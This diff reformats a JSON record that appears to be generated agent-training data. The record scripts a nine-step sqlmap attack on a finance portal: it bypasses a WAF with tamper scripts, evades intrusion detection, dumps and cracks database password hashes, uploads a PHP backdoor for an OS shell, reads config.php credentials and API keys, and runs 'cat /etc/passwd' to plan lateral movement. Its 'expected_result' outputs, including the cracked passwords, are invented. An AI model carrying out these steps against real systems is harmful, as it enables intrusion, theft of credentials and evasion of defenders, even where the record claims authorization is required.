@@ -8,7 +8,9 @@
       "step_number": 1,
       "tool": "sqlmap_advanced_options",
       "action": "Identify WAF protecting the application",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123"
+      },
       "expected_result": "WAF detected: ModSecurity (Trustwave) - blocking standard SQL injection payloads, recommended tampers: modsecurityversioned, space2comment",
       "explanation": "WAF identification crucial for selecting appropriate bypass techniques"
     },
@@ -16,7 +18,10 @@
       "step_number": 2,
       "tool": "sqlmap_advanced_options",
       "action": "Attempt bypass using multiple tamper scripts and random user agent",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123", "tamper_script": "between,randomcase,space2comment"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123",
+        "tamper_script": "between,randomcase,space2comment"
+      },
       "expected_result": "Tamper scripts successful - original payload 'SELECT * FROM users WHERE id=1 AND 1=1' transformed to 'SELECT * FROM users WHERE id=1/**/AnD/**/1 BETWEEN 0 AND 2' - WAF bypassed",
       "explanation": "Multiple tamper scripts increase bypass success rate by obfuscating malicious patterns"
     },
@@ -24,7 +29,12 @@
       "step_number": 3,
       "tool": "sqlmap_advanced_options",
       "action": "Use advanced detection with all techniques and elevated risk level",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123", "risk_level": "3", "level": "5", "techniques": "BEUSTQ"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123",
+        "risk_level": "3",
+        "level": "5",
+        "techniques": "BEUSTQ"
+      },
       "expected_result": "Time-based blind injection successful with high-risk payloads - injection confirmed despite WAF, using SLEEP()-based detection",
       "explanation": "Elevated risk/level tests more payloads including time-based blind which is harder to detect"
     },
@@ -32,7 +42,11 @@
       "step_number": 4,
       "tool": "sqlmap_advanced_options",
       "action": "Implement stealthy scanning with delays to avoid detection",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123", "delay": "2", "timeout": "30"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123",
+        "delay": "2",
+        "timeout": "30"
+      },
       "expected_result": "2-second delay between requests avoids rate limiting - sqlmap completes enumeration without triggering IDS alerts",
       "explanation": "Stealth mode critical in production environments to avoid detection and blocking"
     },
@@ -40,7 +54,9 @@
       "step_number": 5,
       "tool": "sqlmap_session_advanced_ops",
       "action": "Enumerate database users and their privileges",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123"
+      },
       "expected_result": "Found 4 users: root@localhost (DBA privileges), webapp_user@localhost (SELECT, INSERT, UPDATE, DELETE), backup_user@localhost, readonly_user - current connection using webapp_user",
       "explanation": "Privilege enumeration identifies potential for escalation - root user exists with full privileges"
     },
@@ -48,7 +64,9 @@
       "step_number": 6,
       "tool": "sqlmap_session_advanced_ops",
       "action": "Extract MySQL user password hashes",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123"
+      },
       "expected_result": "Extracted password hashes for all MySQL users - successfully cracked root password 'RootPass123!' and webapp_user password 'WebApp2024' using dictionary attack",
       "explanation": "Cracked database credentials enable direct database access bypassing application entirely"
     },
@@ -56,7 +74,9 @@
       "step_number": 7,
       "tool": "sqlmap_os_shell_file_ops",
       "action": "Attempt to gain OS command execution shell",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123"
+      },
       "expected_result": "Successfully uploaded PHP backdoor to /var/www/html/tmpuakzr.php - OS shell active, executing as www-data user with commands: whoami, id, uname -a",
       "explanation": "OS shell access demonstrates complete compromise beyond database - full server access achieved"
     },
@@ -64,7 +84,10 @@
       "step_number": 8,
       "tool": "sqlmap_os_shell_file_ops",
       "action": "Read sensitive configuration files containing credentials",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123", "file_path": "/var/www/html/config.php"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123",
+        "file_path": "/var/www/html/config.php"
+      },
       "expected_result": "Extracted database credentials from config.php: db_user='webapp_admin', db_pass='SecureDBPass123!', plus API keys for payment gateway and email service",
       "explanation": "Configuration file access reveals additional credentials and third-party API keys"
     },
@@ -72,7 +95,10 @@
       "step_number": 9,
       "tool": "sqlmap_os_shell_file_ops",
       "action": "Execute OS command to enumerate system and demonstrate lateral movement potential",
-      "parameters": {"target_url": "https://portal.financecorp.com/account.php?id=123", "command": "cat /etc/passwd"},
+      "parameters": {
+        "target_url": "https://portal.financecorp.com/account.php?id=123",
+        "command": "cat /etc/passwd"
+      },
       "expected_result": "Extracted /etc/passwd revealing 8 user accounts including admin accounts - combined with cracked passwords enables SSH lateral movement to internal systems",
       "explanation": "OS-level access enables reconnaissance for privilege escalation and lateral movement"
     }
@@ -92,7 +118,11 @@
     "created_by": "neural_mesh_v5.2_generator",
     "category": "pentesting",
     "subcategory": "sql_injection",
-    "tools_used": ["sqlmap_advanced_options", "sqlmap_session_advanced_ops", "sqlmap_os_shell_file_ops"],
+    "tools_used": [
+      "sqlmap_advanced_options",
+      "sqlmap_session_advanced_ops",
+      "sqlmap_os_shell_file_ops"
+    ],
     "estimated_time": "60-90 minutes",
     "authorization_required": true,
     "severity": "critical",
